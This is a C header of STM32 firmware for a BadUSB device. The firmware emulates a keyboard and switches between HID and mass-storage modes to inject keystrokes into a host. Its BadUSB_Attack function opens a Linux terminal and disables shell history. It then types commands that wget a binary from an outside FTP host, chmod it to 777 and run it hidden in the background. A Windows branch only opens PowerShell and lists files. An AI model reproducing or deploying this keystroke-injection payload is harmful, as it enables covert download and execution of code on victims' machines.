/*
 * BadUSB_APP.h
 *
 *  Created on: May 13, 2024
 *      Author: 19839
 */

#ifndef INC_BADUSB_APP_H_
#define INC_BADUSB_APP_H_

#include "main.h"
#include "spi.h"
#include "tim.h"
#include "usart.h"
#include "usb_device.h"
#include "gpio.h"
#include "usbd_customhid.h"
#include "usb_device_MSC.h"
#include "BadUSB_Conf.h"

extern USBD_HandleTypeDef hUsbDeviceFS;
extern int isMSC;

int InterruptFlag = 0;
int InterruptCnt = 0;
int PrintCnt = 0;
int NeedRollBack = 0;

void SimulateUSB_unplug();
void SimulateUSB_plugin();
void SwitchToHID();
void SwitchToMSC();
void Get_Single_Descriptor(uint8_t ascii);
void Get_Multi_Descriptor(uint8_t *array, int num);
void SimulateKeyPress(uint8_t ascii);
void SimulateKeyRelease();
void SimulateKeyStroke(uint8_t ascii);
void SimulateShortcutKey(uint8_t *array, int num);
void SimulateKeyStrokes(char *str, int len, int *cntNow);
void PrintRecvBuf(uint8_t Recv_Buf[USBD_CUSTOMHID_INREPORT_BUF_SIZE]);
void InitKeyboardStatus();
void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]);
void InterruptTrap(int *InterruptFlag);
int TestHID();
void BadUSB_Attack(int stage);

void SimulateUSB_unplug(){
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
}

void SimulateUSB_plugin(){
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
}

void SwitchToHID(){
	SimulateUSB_unplug();
	isMSC = 0;
	HAL_Delay(PlugSlot);
	SimulateUSB_plugin();
	MX_TIM2_Init();
	MX_USB_DEVICE_Init();
	HAL_Delay(SwitchDeviceSlot);
}

void SwitchToMSC(){
	SimulateUSB_unplug();
	isMSC = 1;
	HAL_Delay(PlugSlot);
	SimulateUSB_plugin();
	MX_USB_DEVICE_Init_MSC();
	HAL_Delay(SwitchDeviceSlot);
}

void Get_Single_Descriptor(uint8_t ascii){
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	uint8_t Map[MapLen] = Map_Init;
	Convert2CapsMap(Map);
	uint8_t pos = Map[ascii];
	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
	if((pos&0x08) == 8)
		sent_buffer[0] |= 0x02;
}

/*Designed for shortcut key combinations to obtain data packets:
 * for simultaneously pressing multiple keys*/
void Get_Multi_Descriptor(uint8_t *array, int num){
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	uint8_t Map[MapLen] = Map_Init;
	Convert2CapsMap(Map);
	for(int i = 0; i < num; i++){
		uint8_t pos = Map[array[i]];
		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
		if((pos&0x08) == 8)
			sent_buffer[0] |= 0x02;
	}
}

void SimulateKeyPress(uint8_t ascii){
	//get key:ascii Descriptor
	Get_Single_Descriptor(ascii);
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
}

void SimulateKeyRelease(){
	//set 0
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	//Sent Descriptor report
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
}

void SimulateKeyStroke(uint8_t ascii){
	SimulateKeyPress(ascii);
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
	SimulateKeyRelease();
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
}

void SimulateShortcutKey(uint8_t *array, int num){
	Get_Multi_Descriptor(array, num);
	while((recv_buffer[0]&0x02) != 0x02){
		SimulateKeyStroke(128);
	}
	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
	SimulateKeyRelease();
	HAL_Delay(ShortcutSlot); //Wait to avoid conflict
}

void SimulateKeyStrokes(char *str, int len, int *cntNow){
	for(*cntNow = 0; *cntNow < len; (*cntNow)++){
    	//Ensure func SimulateKeyStroke is executed in uppercase environment.
		if((recv_buffer[0]&0x02) != 0x02){
			SimulateKeyStroke(128);
    	}
		SimulateKeyStroke(str[*cntNow]);
		//Determine if RollBack is necessary
		if(NeedRollBack == 1){
			NeedRollBack = 0;
			(*cntNow)--;
			SimulateKeyStroke(129);
		}
	}
}

void PrintRecvBuf(uint8_t Recv_Buf[USBD_CUSTOMHID_INREPORT_BUF_SIZE]){
	HAL_Delay(StrokeSlot);
	for(int i = 0; i < USBD_CUSTOMHID_INREPORT_BUF_SIZE; i++){
		for(int j = 0; j < 8; j++){
			SimulateKeyStroke(((Recv_Buf[i]&(uint8_t)(0x01<<j))>>j)+'0');
		}
	}
	SimulateKeyStroke('\n');
}

void InitKeyboardStatus(){//Convert keyboard to uppercase mode
	SimulateKeyStroke(128);
	HAL_Delay(StrokeSlot);
	if((recv_buffer[0]&0x02) != 0x02){
		SimulateKeyStroke(128);
		PrintRecvBuf(recv_buffer);  //print Keyboard LED Status
	}
}

void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]){
	for(uint8_t cnt = 'A'; cnt <= 'Z'; cnt++){
		LowerCaseMap[cnt] &= 0xf7;
		LowerCaseMap[cnt+'a'-'A'] |= 0x08;
	}
}

void InterruptTrap(int *InterruptFlag){
	if(*InterruptFlag == 1){
		*InterruptFlag = 0;
		//Trigger timer interrupt immediately by setting the value of the register
		TIM2->EGR |= TIM_EGR_UG;
		//Second entry interrupt
		MX_TIM2_Init();
		HAL_TIM_Base_Start_IT(&htim2);
	}
}

int TestHID(){
	char testStr[4] = {133, 133, 133, 133};
	SimulateKeyStroke(133);
	uint8_t PrevState = recv_buffer[0]&0x01;
	SimulateKeyStrokes(testStr, 4, &PrintCnt);
	uint8_t CurrState = recv_buffer[0]&0x01;
	return PrevState == CurrState;
}

void BadUSB_Attack(int stage){
#if Target == FPGA
	if(stage == 0){
		uint8_t Terminal[3] = LinuxTerminal;
		char AttackStr0[256] = {'\0'};
		strcat(AttackStr0, "set +o history\n");
		strcat(AttackStr0, "cd /home/user/Templates\n");
		strcat(AttackStr0, "wget -q ftp://anonymous:@");
		strcat(AttackStr0, File_Host_Addr);
		strcat(AttackStr0, "/MSCDrv >/dev/null 2>&1 &\n");
		strcat(AttackStr0, "set -o history\n");
		strcat(AttackStr0, "exit\n");
		SimulateShortcutKey(Terminal, 3);
		SimulateKeyStrokes(AttackStr0, strlen(AttackStr0), &PrintCnt);
	}else if(stage == 1){
		uint8_t Terminal[3] = LinuxTerminal;
		char AttackStr1[256] = {'\0'};
		strcat(AttackStr1, "set +o history\n");
		strcat(AttackStr1, "cd /home/user/Templates\n");
		strcat(AttackStr1, "chmod 777 MSCDrv\n");
		strcat(AttackStr1, "./MSCDrv >/dev/null 2>&1 &\n");
		strcat(AttackStr1, "set -o history\n");
		strcat(AttackStr1, "exit\n");
		SimulateShortcutKey(Terminal, 3);
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#elif Target == Desktop
	if(stage == 0){
		uint8_t Terminal[2] = WindowsTerminal;
		char AttackStr[256], AttackStr1[256];
		strcpy(AttackStr, "powershell\n");
		strcpy(AttackStr1, "ls\n\nexit\n");
		SimulateShortcutKey(Terminal, 2);
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
		HAL_Delay(InjectStringSlot);
		SimulateKeyStrokes(AttackStr1, strlen(AttackStr1), &PrintCnt);
	}else{    //test
		char AttackStr[256];
		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
	}
#endif
}



#endif /* INC_BADUSB_APP_H_ */
